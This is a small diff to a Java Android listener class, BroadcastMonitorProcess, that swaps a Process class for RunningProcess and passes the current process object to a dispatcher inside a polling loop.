@@ -1,6 +1,6 @@
 package com.ht.RCSAndroidGUI.listener;
 
-import com.ht.RCSAndroidGUI.Process;
+import com.ht.RCSAndroidGUI.RunningProcess;
 
 public class BroadcastMonitorProcess extends Thread {
 	/** The Constant TAG. */
@@ -20,8 +20,9 @@ public class BroadcastMonitorProcess extends Thread {
 				return;
 			}
 
+			RunningProcess p = RunningProcess.self();
 			
-			onReceive(false);
+			onReceive(p);
 
 			try {
 				wait(period);
@@ -31,8 +32,8 @@ public class BroadcastMonitorProcess extends Thread {
 		} while (true);
 	}
 
-	public void onReceive(boolean isConnected) {	
-		ListenerProcess.self().dispatch(new Process());
+	public void onReceive(RunningProcess p) {	
+		ListenerProcess.self().dispatch(p);
 	}
 
 	void register() {
